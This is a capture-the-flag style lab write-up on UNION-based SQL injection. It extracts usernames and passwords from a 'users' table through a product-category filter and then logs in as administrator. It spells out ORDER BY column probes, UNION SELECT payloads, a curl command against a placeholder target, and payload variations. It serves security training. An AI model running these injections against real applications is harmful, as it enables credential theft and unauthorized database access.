# SQL injection UNION attack, retrieving data from other tables — Practitioner

**Status:** Solved

---

## Goal

Use UNION-based SQL injection to retrieve sensitive data from a different table. Extract usernames and passwords from the 'users' table and log in as the administrator.

---

## Steps (simple & complete)

1. **Find the injection point**
   - Browse to the shopping application
   - Click on any product category:
```
   GET /filter?category=Gifts
```
   - This parameter is vulnerable to SQL injection

2. **Read the lab description**
   - Lab tells you there's a table called `users`
   - It contains columns: `username` and `password`
   - Your goal: extract administrator credentials

3. **Determine the number of columns**
   - Use ORDER BY to find column count:
```
   Gifts' ORDER BY 1--
   Gifts' ORDER BY 2--
   Gifts' ORDER BY 3--
```
   - Let's say it has 2 columns (error at ORDER BY 3)

4. **Verify both columns accept text**
   - Test with strings in both positions:
```
   Gifts' UNION SELECT 'abc','def'--
```
   - If no error, both columns can handle text data

5. **Extract data from users table**
   - Use UNION to query the users table:
```
   Gifts' UNION SELECT username,password FROM users--
```
   - This combines product data with user credentials

6. **Execute the injection**
```bash
   curl -s "https://TARGET/filter?category=Gifts'+UNION+SELECT+username,password+FROM+users--"
```

7. **Find administrator credentials in output**
   - Browse the page and look for user data
   - You'll see usernames and passwords mixed with products
   - Example output might show:
```
   Product: Laptop
   administrator
   s3cur3p@ssw0rd
   Product: Mouse
   wiener
   peter
   carlos
   montoya
```

8. **Extract administrator password**
   - Locate the row with username `administrator`
   - Copy the password that appears next to it
   - Note: Password is in the second column position

9. **Log in as administrator**
   - Navigate to the login page
   - Username: `administrator`
   - Password: (paste the extracted password)
   - Click "Log in"
   - Lab solves automatically upon successful login

---

## Example

- Vulnerable endpoint: `GET /filter?category=Gifts`
- Column count: 2 columns
- Both columns accept text
- Target table: `users` with columns `username`, `password`

**Payload:**
```bash
curl -s "https://TARGET/filter?category=Gifts'+UNION+SELECT+username,password+FROM+users--"
```

**Sample output on page:**
```
Ergonomic Wooden Computer - $799
administrator
p@ssw0rd123!
Rustic Wooden Keyboard - $29
wiener
peter
Handcrafted Steel Chair - $149
carlos
montoya
```

**Extracted credentials:**
- Username: `administrator`
- Password: `p@ssw0rd123!`

---

## How UNION injection works

**Original query (simplified):**
```sql
SELECT product_name, description FROM products WHERE category = 'Gifts'
```

**Injected query:**
```sql
SELECT product_name, description FROM products WHERE category = 'Gifts' 
UNION 
SELECT username, password FROM users--'
```

**What happens:**
1. First SELECT returns products (normal behavior)
2. UNION combines it with second SELECT
3. Second SELECT returns user credentials
4. Results are merged and displayed together
5. Application shows both products AND user data

---

## Why this attack is dangerous

**Breaking access controls:**
- Original query only accesses `products` table
- Application assumes you can only see products
- UNION lets you query ANY table in the database
- Completely bypasses application logic

**No authentication needed:**
- Don't need to be admin to read admin data
- Don't need special privileges
- Just need SQL injection vulnerability
- Can access any data the database user can read

**Real-world impact:**
- Steal user credentials
- Extract payment information
- Read private messages
- Download entire databases
- Access configuration secrets

---

## Key concepts

**Column matching:**
- UNION requires same number of columns
- First column maps to first column
- Second column maps to second column
- Data types should be compatible

**Getting all rows:**
- UNION returns ALL rows from both queries
- One injection extracts entire users table
- No need to loop or guess usernames
- Efficient data extraction

**Comment importance:**
- `--` comments out rest of original query
- Prevents syntax errors
- Makes injection clean and reliable
- Essential for successful exploitation

---

## Variations to try

**If column order is different:**
```sql
Gifts' UNION SELECT password,username FROM users--
```

**If you need specific user only:**
```sql
Gifts' UNION SELECT username,password FROM users WHERE username='administrator'--
```

**If there are more columns:**
```sql
Gifts' UNION SELECT username,password,NULL FROM users--
```

---

## Common issues

**No data appears:**
- Check if both columns are visible on page
- Verify table and column names are correct
- Ensure column count matches
- Try viewing page source

**Type errors:**
- Make sure data types are compatible
- Use NULL for non-text columns
- Verify column positions

**Wrong credentials:**
- Double-check which value is password
- Some apps hash passwords (won't be plaintext)
- Try all extracted credentials

---

